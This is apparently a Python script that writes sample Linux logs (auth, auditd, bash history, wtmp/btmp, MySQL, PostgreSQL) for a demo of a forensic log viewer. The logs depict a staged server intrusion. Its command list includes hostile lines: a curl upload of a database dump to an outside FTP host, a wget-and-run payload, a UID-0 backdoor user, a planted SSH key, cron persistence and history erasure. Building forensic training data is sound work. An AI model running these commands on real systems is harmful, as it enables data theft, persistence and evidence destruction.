#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
make_sample.py — secviewer 데모용 가상 침해 시나리오 로그 생성

  python make_sample.py              # ./samples 에 / 구조로 로그 생성
  python secviewer.py --root samples --tz +09:00

시나리오 (2026-10-03, KST, 호스트 web01)
  01:30  관리자 alice 정상 접속 (내부망 10.0.0.15)
  02:10  45.133.1.77 SSH 무차별 대입 → 02:14 root 로그인 성공
  02:14  정찰 → wp-config.php 열람 → mysqldump / pg_dump → tar 압축
  02:25  curl 로 DB 덤프 FTP 업로드, 악성 스크립트 다운로드·실행
  02:28  UID 0 백도어 계정, authorized_keys, crontab 등록 → history 삭제
  02:41  SFTP 로 압축 파일 다운로드(유출), 02:45 추가한 키로 scp 다운로드
  02:50  91.240.118.5 에서 백도어 계정 sysupd 로 재접속
"""
import datetime as dt
import gzip
import os
import random
import struct

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'samples')
KST = dt.timezone(dt.timedelta(hours=9))
HOST = 'web01'
ATK, ATK2, ADMIN = '45.133.1.77', '91.240.118.5', '10.0.0.15'
SERVER_IP = '10.0.0.5'  # 이 서버(web01) 자신의 IP
random.seed(7)


def T(hms, day=3):
    h, m, s = map(int, hms.split(':'))
    return dt.datetime(2026, 10, day, h, m, s, tzinfo=KST)


def syslog(t, prog, pid, msg):
    return f'{t.strftime("%b")} {t.day:>2} {t.strftime("%H:%M:%S")} {HOST} {prog}[{pid}]: {msg}'


def write(rel, text, mtime=None, gz=False):
    p = os.path.join(ROOT, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    data = text.encode('utf-8')
    if gz:
        with gzip.open(p, 'wb') as f:
            f.write(data)
    else:
        with open(p, 'wb') as f:
            f.write(data)
    if mtime:
        os.utime(p, (mtime.timestamp(), mtime.timestamp()))


# ── 공격자 명령 (root, audit ses=5) ──
# (시각, 셸에 친 명령, [auditd 에 찍히는 프로세스 argv 들])
ATTACK_CMDS = [
    ('02:14:20', 'whoami', [['whoami']]),
    ('02:14:25', 'id', [['id']]),
    ('02:14:31', 'uname -a', [['uname', '-a']]),
    ('02:14:40', 'cat /etc/passwd', [['cat', '/etc/passwd']]),
    ('02:14:52', 'ss -tlnp', [['ss', '-tlnp']]),
    ('02:15:10', "ps aux | grep -E 'mysql|postgres'", [['ps', 'aux'], ['grep', '-E', 'mysql|postgres']]),
    ('02:15:40', 'cat /var/www/html/wp-config.php', [['cat', '/var/www/html/wp-config.php']]),
    ('02:16:30', "mysql -uroot -p'Wp!2024db' -e 'show databases'", [['mysql', '-uroot', '-pWp!2024db', '-e', 'show databases']]),
    ('02:18:02', 'mkdir -p /tmp/.x', [['mkdir', '-p', '/tmp/.x']]),
    ('02:18:15', "mysqldump -uroot -p'Wp!2024db' --all-databases | gzip > /tmp/.x/db.sql.gz",
     [['mysqldump', '-uroot', '-pWp!2024db', '--all-databases'], ['gzip']]),
    ('02:22:40', 'sudo -u postgres pg_dump crm > /tmp/.x/crm.sql',
     [['sudo', '-u', 'postgres', 'pg_dump', 'crm'], ['pg_dump', 'crm']]),
    ('02:24:05', 'tar czf /tmp/.x/www.tgz /var/www/html', [['tar', 'czf', '/tmp/.x/www.tgz', '/var/www/html'], ['gzip']]),
    ('02:25:30', 'curl -T /tmp/.x/db.sql.gz ftp://185.220.101.4/up/ --user anon:anon',
     [['curl', '-T', '/tmp/.x/db.sql.gz', 'ftp://185.220.101.4/up/', '--user', 'anon:anon']]),
    ('02:27:00', 'wget -q http://185.220.101.4/k.sh -O /tmp/.x/k.sh',
     [['wget', '-q', 'http://185.220.101.4/k.sh', '-O', '/tmp/.x/k.sh']]),
    ('02:27:10', 'chmod +x /tmp/.x/k.sh', [['chmod', '+x', '/tmp/.x/k.sh']]),
    ('02:27:15', 'nohup /tmp/.x/k.sh >/dev/null 2>&1 &', [['/tmp/.x/k.sh']]),
    ('02:28:40', 'useradd -o -u 0 -g 0 -M -s /bin/bash sysupd', [['useradd', '-o', '-u', '0', '-g', '0', '-M', '-s', '/bin/bash', 'sysupd']]),
    ('02:28:52', "echo 'sysupd:Upd@te99' | chpasswd", [['chpasswd']]),
    ('02:29:30', "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7xq attacker@kali' >> /root/.ssh/authorized_keys", []),
    ('02:30:05', "(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.x/k.sh') | crontab -", [['crontab', '-l'], ['crontab', '-']]),
    ('02:31:20', 'unset HISTFILE', []),
    ('02:31:22', 'history -c', []),
]


class Audit:
    def __init__(self):
        self.serial = 1200
        self.lines = []

    def _hdr(self, typ, t):
        return f'type={typ} msg=audit({t.timestamp():.3f}:{self.serial}): '

    @staticmethod
    def enc(a):
        if any(c in a for c in ' "\'') or any(ord(c) < 0x21 or ord(c) > 0x7e for c in a):
            return a.encode().hex().upper()
        return f'"{a}"'

    def login(self, t, pid, ses, user, uid, ip, ok=True):
        self.serial += 1
        res = 'success' if ok else 'failed'
        self.lines.append(self._hdr('USER_LOGIN', t) + f"pid={pid} uid=0 auid={uid} ses={ses} subj=unconfined "
                          f"msg='op=login id={uid} exe=\"/usr/sbin/sshd\" hostname=? addr={ip} terminal=/dev/pts/1 res={res}'")

    def execve(self, t, argv, ses, auid, uid=0, pid=None, cwd='/root'):
        self.serial += 1
        pid = pid or random.randint(3000, 9000)
        exe = argv[0] if argv[0].startswith('/') else f'/usr/bin/{argv[0]}'
        h = self._hdr('SYSCALL', t)
        self.lines.append(h + f'arch=c000003e syscall=59 success=yes exit=0 ppid={pid - 1} pid={pid} auid={auid} uid={uid} '
                              f'gid=0 euid={uid} tty=pts1 ses={ses} comm="{os.path.basename(argv[0])[:15]}" exe="{exe}" key=(null)')
        args = ' '.join(f'a{i}={self.enc(a)}' for i, a in enumerate(argv))
        self.lines.append(self._hdr('EXECVE', t) + f'argc={len(argv)} {args}')
        self.lines.append(self._hdr('CWD', t) + f'cwd="{cwd}"')
        self.lines.append(self._hdr('PROCTITLE', t) + 'proctitle=' + '00'.join(a.encode().hex().upper() for a in argv))

    def daemon(self, t, argv):
        self.serial += 1
        self.lines.append(self._hdr('SYSCALL', t) + f'arch=c000003e syscall=59 success=yes exit=0 ppid=1 pid=812 auid=4294967295 '
                                                     f'uid=0 tty=(none) ses=4294967295 comm="{argv[0]}" exe="/usr/bin/{argv[0]}"')
        self.lines.append(self._hdr('EXECVE', t) + f'argc={len(argv)} ' + ' '.join(f'a{i}="{a}"' for i, a in enumerate(argv)))


def utmp(typ, pid, tty, user, host, t):
    return struct.pack('<hxxi32s4s32s256shhiii4i20s', typ, pid, tty.encode(), tty[-2:].encode(), user.encode(),
                       host.encode(), 0, 0, 0, int(t.timestamp()), 0, 0, 0, 0, 0, b'')


def main():
    auth, audit = [], Audit()
    mtime = T('03:00:00')

    # ── 전날(auth.log.1): 평범한 관리 작업 ──
    prev = [
        syslog(T('09:02:11', 2), 'sshd', 1101, f'Accepted publickey for alice from {ADMIN} port 50122 ssh2: ED25519 SHA256:aLiCeKeY0f1nGeRpRiNt'),
        syslog(T('09:02:11', 2), 'sshd', 1101, 'pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)'),
        syslog(T('09:03:40', 2), 'sudo', 1130, '   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx'),
        syslog(T('09:20:02', 2), 'sshd', 1101, f'Disconnected from user alice {ADMIN} port 50122'),
        syslog(T('09:20:02', 2), 'sshd', 1101, 'pam_unix(sshd:session): session closed for user alice'),
        syslog(T('14:41:09', 2), 'sshd', 1422, 'Invalid user oracle from 103.152.18.4 port 41022'),
        syslog(T('14:41:11', 2), 'sshd', 1422, 'Failed password for invalid user oracle from 103.152.18.4 port 41022 ssh2'),
        syslog(T('14:41:15', 2), 'sshd', 1424, 'Failed password for root from 103.152.18.4 port 41040 ssh2'),
    ]
    write('var/log/auth.log.1', '\n'.join(prev) + '\n', T('23:59:00', 2))

    # ── 01:30 alice 정상 접속 ──
    auth += [
        syslog(T('01:30:12'), 'sshd', 1802, f'Accepted publickey for alice from {ADMIN} port 50312 ssh2: ED25519 SHA256:aLiCeKeY0f1nGeRpRiNt'),
        syslog(T('01:30:12'), 'sshd', 1802, 'pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)'),
        syslog(T('01:31:05'), 'sudo', 1840, '   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update'),
        syslog(T('01:31:05'), 'sudo', 1840, 'pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)'),
        syslog(T('01:45:30'), 'sshd', 1802, f'Received disconnect from {ADMIN} port 50312:11: disconnected by user'),
        syslog(T('01:45:30'), 'sshd', 1802, f'Disconnected from user alice {ADMIN} port 50312'),
        syslog(T('01:45:30'), 'sshd', 1802, 'pam_unix(sshd:session): session closed for user alice'),
    ]
    audit.login(T('01:30:13'), 1802, 3, 'alice', 1000, ADMIN)
    for t, argv in (('01:31:05', ['sudo', 'apt', 'update']), ('01:33:10', ['df', '-h']), ('01:34:02', ['ls', '-la', '/var/www'])):
        audit.execve(T(t), argv, 3, 1000, uid=1000, cwd='/home/alice')
    audit.daemon(T('02:00:01'), ['run-parts', '/etc/cron.hourly'])
    auth.append(syslog(T('02:00:01'), 'CRON', 1990, 'pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)'))

    # ── 02:10 무차별 대입 ──
    t = T('02:10:03')
    users = ['admin', 'test', 'oracle', 'ubuntu', 'postgres', 'git', 'root', 'admin', 'root', 'deploy', 'root', 'root']
    btmp = b''
    pid = 2100
    for i in range(36):
        u = users[i % len(users)]
        port = 50000 + i * 37
        invalid = u not in ('root', 'postgres', 'ubuntu')
        if invalid:
            auth.append(syslog(t, 'sshd', pid, f'Invalid user {u} from {ATK} port {port}'))
        auth.append(syslog(t, 'sshd', pid, f'Failed password for {"invalid user " if invalid else ""}{u} from {ATK} port {port} ssh2'))
        btmp += utmp(6, pid, 'ssh:notty', u, ATK, t)
        t += dt.timedelta(seconds=random.randint(4, 9))
        if i % 3 == 2:
            auth.append(syslog(t, 'sshd', pid, f'Connection closed by authenticating user {u} {ATK} port {port} [preauth]'))
            pid += 2

    # ── 02:14 root 로그인 성공 (세션 1: 대화형) ──
    auth += [
        syslog(T('02:14:07'), 'sshd', 2211, f'Connection from {ATK} port 51544 on {SERVER_IP} port 22 rdomain ""'),
        syslog(T('02:14:07'), 'sshd', 2211, f'Accepted password for root from {ATK} port 51544 ssh2'),
        syslog(T('02:14:07'), 'sshd', 2211, 'pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)'),
    ]
    audit.login(T('02:14:08'), 2211, 5, 'root', 0, ATK)
    wtmp = utmp(7, 1802, 'pts/0', 'alice', ADMIN, T('01:30:12')) + utmp(8, 1802, 'pts/0', '', '', T('01:45:30'))
    wtmp += utmp(7, 2213, 'pts/1', 'root', ATK, T('02:14:08'))

    hist = []
    for hms, line, procs in ATTACK_CMDS:
        tt = T(hms)
        hist += [f'#{int(tt.timestamp())}', line]
        for k, argv in enumerate(procs):
            uid = 105 if argv[0] == 'pg_dump' else 0
            audit.execve(tt + dt.timedelta(seconds=k), argv, 5, 0, uid=uid)
    # history 를 끈 뒤(02:31) 에 한 일 — auditd 에만 남는다
    #  02:32 내부망 다른 서버로 SSH (나간 접속), 02:32:40 이 서버 자신으로 다시 SSH (서버 내부에서 출발한 접속)
    audit.execve(T('02:32:10'), ['ssh', '-o', 'StrictHostKeyChecking=no', 'deploy@10.0.0.20'], 5, 0, pid=2340)
    audit.execve(T('02:32:40'), ['ssh', f'root@{SERVER_IP}'], 5, 0, pid=2348)
    auth += [
        syslog(T('02:32:41'), 'sshd', 2350, f'Connection from {SERVER_IP} port 40122 on {SERVER_IP} port 22 rdomain ""'),
        syslog(T('02:32:41'), 'sshd', 2350, f'Accepted password for root from {SERVER_IP} port 40122 ssh2'),
        syslog(T('02:32:41'), 'sshd', 2350, 'pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)'),
        syslog(T('02:33:20'), 'sshd', 2350, f'Disconnected from user root {SERVER_IP} port 40122'),
        syslog(T('02:33:20'), 'sshd', 2350, 'pam_unix(sshd:session): session closed for user root'),
    ]
    audit.login(T('02:32:42'), 2350, 9, 'root', 0, SERVER_IP)
    audit.execve(T('02:32:55'), ['cat', '/root/.ssh/id_rsa'], 9, 0)
    audit.execve(T('02:33:05'), ['ssh', '-i', '/root/.ssh/id_rsa', 'backup@10.0.0.30'], 9, 0)
    auth += [
        syslog(T('02:22:40'), 'sudo', 2290, '    root : TTY=pts/1 ; PWD=/root ; USER=postgres ; COMMAND=/usr/bin/pg_dump crm'),
        syslog(T('02:28:40'), 'useradd', 2301, 'new group: name=sysupd, GID=0'),
        syslog(T('02:28:40'), 'useradd', 2301, 'new user: name=sysupd, UID=0, GID=0, home=/home/sysupd, shell=/bin/bash, from=/dev/pts/1'),
        syslog(T('02:28:52'), 'chpasswd', 2305, 'pam_unix(chpasswd:chauthtok): password changed for sysupd'),
        syslog(T('02:33:50'), 'sshd', 2211, f'Received disconnect from {ATK} port 51544:11: disconnected by user'),
        syslog(T('02:33:50'), 'sshd', 2211, f'Disconnected from user root {ATK} port 51544'),
        syslog(T('02:33:50'), 'sshd', 2211, 'pam_unix(sshd:session): session closed for user root'),
    ]
    wtmp += utmp(8, 2213, 'pts/1', '', '', T('02:33:50'))

    # ── 02:41 SFTP 로 유출 (세션 2) ──
    auth += [
        syslog(T('02:41:02'), 'sshd', 2390, f'Accepted password for root from {ATK} port 51702 ssh2'),
        syslog(T('02:41:02'), 'sshd', 2390, 'pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)'),
        syslog(T('02:41:03'), 'sshd', 2390, 'subsystem request for sftp by user root'),
        syslog(T('02:41:03'), 'internal-sftp', 2392, f'session opened for local user root from [{ATK}]'),
        syslog(T('02:41:20'), 'internal-sftp', 2392, 'open "/tmp/.x/www.tgz" flags READ mode 0666'),
        syslog(T('02:42:31'), 'internal-sftp', 2392, 'close "/tmp/.x/www.tgz" bytes read 48234496 written 0'),
        syslog(T('02:42:40'), 'internal-sftp', 2392, 'open "/tmp/.x/crm.sql" flags READ mode 0666'),
        syslog(T('02:42:58'), 'internal-sftp', 2392, 'close "/tmp/.x/crm.sql" bytes read 9437184 written 0'),
        syslog(T('02:43:05'), 'internal-sftp', 2392, 'remove name "/tmp/.x/crm.sql"'),
        syslog(T('02:43:10'), 'internal-sftp', 2392, f'session closed for local user root from [{ATK}]'),
        syslog(T('02:43:10'), 'sshd', 2390, f'Disconnected from user root {ATK} port 51702'),
        syslog(T('02:43:10'), 'sshd', 2390, 'pam_unix(sshd:session): session closed for user root'),
    ]
    audit.login(T('02:41:03'), 2390, 6, 'root', 0, ATK)

    # ── 02:45 심어둔 키로 scp 다운로드 (세션 3) ──
    auth += [
        syslog(T('02:45:30'), 'sshd', 2420, f'Accepted publickey for root from {ATK} port 51766 ssh2: ED25519 SHA256:Atk3rK1ckK3yF1ngerPr1nt'),
        syslog(T('02:45:30'), 'sshd', 2420, 'pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)'),
        syslog(T('02:45:44'), 'sshd', 2420, f'Disconnected from user root {ATK} port 51766'),
        syslog(T('02:45:44'), 'sshd', 2420, 'pam_unix(sshd:session): session closed for user root'),
    ]
    audit.login(T('02:45:31'), 2420, 7, 'root', 0, ATK)
    audit.execve(T('02:45:31'), ['scp', '-f', '/tmp/.x/db.sql.gz'], 7, 0)

    # ── 02:50 백도어 계정으로 다른 IP 재접속 (세션 4) ──
    auth += [
        syslog(T('02:50:10'), 'sshd', 2501, f'Accepted password for sysupd from {ATK2} port 40211 ssh2'),
        syslog(T('02:50:10'), 'sshd', 2501, 'pam_unix(sshd:session): session opened for user sysupd(uid=0) by (uid=0)'),
        syslog(T('02:52:02'), 'sshd', 2501, f'Disconnected from user sysupd {ATK2} port 40211'),
        syslog(T('02:52:02'), 'sshd', 2501, 'pam_unix(sshd:session): session closed for user sysupd'),
    ]
    audit.login(T('02:50:11'), 2501, 8, 'sysupd', 0, ATK2)
    audit.execve(T('02:50:20'), ['id'], 8, 0)
    audit.execve(T('02:50:31'), ['cat', '/etc/shadow'], 8, 0)
    audit.execve(T('02:51:02'), ['ls', '-la', '/tmp/.x'], 8, 0)
    audit.execve(T('02:51:40'), ['python3', '-c', 'import pty;pty.spawn("/bin/bash")'], 8, 0)
    wtmp += utmp(7, 2503, 'pts/1', 'sysupd', ATK2, T('02:50:11')) + utmp(8, 2503, 'pts/1', '', '', T('02:52:02'))

    write('var/log/auth.log', '\n'.join(sorted(auth, key=lambda l: l[:15])) + '\n', mtime)
    write('var/log/audit/audit.log', '\n'.join(audit.lines) + '\n', mtime)
    write('root/.bash_history', '\n'.join(hist) + '\n', mtime)
    write('home/alice/.bash_history', 'sudo apt update\ndf -h\nls -la /var/www\nssh backup@10.0.0.30\nexit\n', mtime)
    write('root/.ssh/known_hosts', '\n'.join([
        '10.0.0.30 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBk9backupserver',
        '10.0.0.20 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeploySrv20',
        f'{SERVER_IP} ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIWeb01Self',
        '|1|kq2bZ8Ri2vQf3Yt0n9KXo7rQ1aI=|mE0zW0b9Qy8Rk3Lr2bT0Q1v9x3A= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHashed',
    ]) + '\n', mtime)
    for name, data in (('var/log/wtmp', wtmp), ('var/log/btmp', btmp)):
        p = os.path.join(ROOT, name)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, 'wb') as f:
            f.write(data)
        os.utime(p, (mtime.timestamp(), mtime.timestamp()))

    write('etc/passwd', '\n'.join([
        'root:x:0:0:root:/root:/bin/bash',
        'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false',
        'postgres:x:105:111:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash',
        'alice:x:1000:1000:Alice,,,:/home/alice:/bin/bash',
        'sysupd:x:0:0::/home/sysupd:/bin/bash',
    ]) + '\n', mtime)

    # ── MySQL general log (UTC) ──
    def my(t):
        return t.astimezone(dt.timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f') + 'Z'
    q = [
        f'{my(T("02:16:30"))}\t   41 Connect\troot@localhost on  using Socket',
        f'{my(T("02:16:30"))}\t   41 Query\tselect @@version_comment limit 1',
        f'{my(T("02:16:30"))}\t   41 Query\tshow databases',
        f'{my(T("02:16:30"))}\t   41 Quit\t',
        f'{my(T("02:18:16"))}\t   42 Connect\troot@localhost on  using Socket',
        f"{my(T('02:18:16'))}\t   42 Query\t/*!40100 SET @@SQL_MODE='' */",
        f"{my(T('02:18:16'))}\t   42 Query\t/*!40103 SET TIME_ZONE='+00:00' */",
        f'{my(T("02:18:16"))}\t   42 Query\tSET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ',
        f'{my(T("02:18:16"))}\t   42 Query\tSTART TRANSACTION /*!40100 WITH CONSISTENT SNAPSHOT */',
    ]
    t = T('02:18:17')
    for db, tables in (('wordpress', ['wp_options', 'wp_posts', 'wp_users', 'wp_usermeta', 'wp_comments']),
                       ('shop', ['customers', 'orders', 'payments', 'coupons'])):
        q.append(f'{my(t)}\t   42 Init DB\t{db}')
        for tb in tables:
            q.append(f'{my(t)}\t   42 Query\tSHOW CREATE TABLE `{tb}`')
            q.append(f'{my(t)}\t   42 Query\tSELECT /*!40001 SQL_NO_CACHE */ * FROM `{tb}`')
            t += dt.timedelta(seconds=random.randint(5, 30))
    q.append(f'{my(t)}\t   42 Quit\t')
    q.append(f'{my(T("02:35:00"))}\t   43 Connect\twp@localhost on wordpress using TCP/IP')
    q.append(f'{my(T("02:35:00"))}\t   43 Query\tSELECT option_value FROM wp_options WHERE autoload = \'yes\'')
    q.append(f'{my(T("02:35:00"))}\t   43 Quit\t')
    write('var/log/mysql/mysql.log', '/usr/sbin/mysqld, Version: 8.0.39 (MySQL Community Server - GPL). started with:\n'
          'Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock\nTime                 Id Command    Argument\n'
          + '\n'.join(q) + '\n', mtime)

    # ── PostgreSQL ──
    def pg(t):
        return t.strftime('%Y-%m-%d %H:%M:%S.') + f'{random.randint(0, 999):03d} KST'
    pgl = [
        f'{pg(T("02:22:41"))} [3120] [unknown]@[unknown] LOG:  connection received: host=[local]',
        f'{pg(T("02:22:41"))} [3120] postgres@crm LOG:  connection authorized: user=postgres database=crm application_name=pg_dump',
    ]
    for tb in ('public.customers', 'public.contacts', 'public.deals', 'public.invoices'):
        pgl.append(f'{pg(T("02:22:44"))} [3120] postgres@crm LOG:  statement: COPY {tb} (id, name, email, phone, created_at) TO stdout;')
    pgl.append(f'{pg(T("02:23:30"))} [3120] postgres@crm LOG:  disconnection: session time: 0:00:49.102 user=postgres database=crm host=[local]')
    write('var/log/postgresql/postgresql-16-main.log', '\n'.join(pgl) + '\n', mtime)

    print(f'샘플 로그 생성: {ROOT}')


if __name__ == '__main__':
    main()
